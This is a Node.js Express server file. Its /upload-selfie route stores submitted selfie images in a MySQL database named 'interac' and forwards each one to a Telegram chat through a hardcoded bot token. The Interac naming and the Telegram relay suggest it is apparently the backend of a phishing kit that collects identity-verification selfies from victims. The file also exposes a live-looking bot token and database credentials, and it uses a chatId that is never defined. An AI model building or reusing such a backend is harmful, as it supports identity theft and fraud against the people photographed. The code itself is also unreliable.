const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api'); // Import the Telegram library
const app = express();
const port = 3000; // Set your desired port

// Replace 'YOUR_BOT_TOKEN' with your actual Telegram bot token
const botToken = '6547328306:AAEnq4Xr-RP5viMI34r5ZTSH90lU_807TP4';
const bot = new TelegramBot(botToken, { polling: false });

// Configure middleware to parse JSON data
app.use(bodyParser.json());

// MySQL database configuration
const mysql = require('mysql2');
const dbConfig = {
    host: 'localhost',
    user: 'interac',
    password: 'interac',
    database: 'interac',
};

// SQL file path
const sqlFilePath = './initial_data.sql';

// Route to handle uploading the selfie and setting up the database
app.post('/upload-selfie', (req, res) => {
    // Extract the selfie data URL from the request body
    const { selfieDataUrl } = req.body;

    // Create a MySQL connection
    const connection = mysql.createConnection(dbConfig);

    connection.connect(err => {
        if (err) {
            console.error('Database connection error:', err);
            res.status(500).json({ message: 'Failed to connect to the database.' });
            return;
        }

        // Read the SQL file and execute the SQL commands
        const fs = require('fs');
        const sqlCommands = fs.readFileSync(sqlFilePath, 'utf8');

        connection.query(sqlCommands, (error, results) => {
            if (error) {
                console.error('Database query error:', error);
                res.status(500).json({ message: 'Failed to execute SQL commands.' });
            } else {
                // Insert the selfie data URL into your database
                connection.query('INSERT INTO selfies (dataUrl) VALUES (?)', [selfieDataUrl], (error, results) => {
                    if (error) {
                        console.error('Database query error:', error);
                        res.status(500).json({ message: 'Failed to insert selfie data into the database.' });
                    } else {
                        console.log('Selfie data inserted successfully.');

                        // Send the selfie to Telegram
                        bot.sendPhoto(chatId, selfieDataUrl)
                            .then(() => {
                                console.log('Selfie sent to Telegram successfully.');
                                res.status(200).json({ message: 'Selfie captured and sent to Telegram.' });
                            })
                            .catch(err => {
                                console.error('Telegram sending error:', err);
                                res.status(500).json({ message: 'Failed to send the selfie to Telegram.' });
                            });
                    }
                    connection.end(); // Close the database connection
                });
            }
        });
    });
});

// Start the server
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
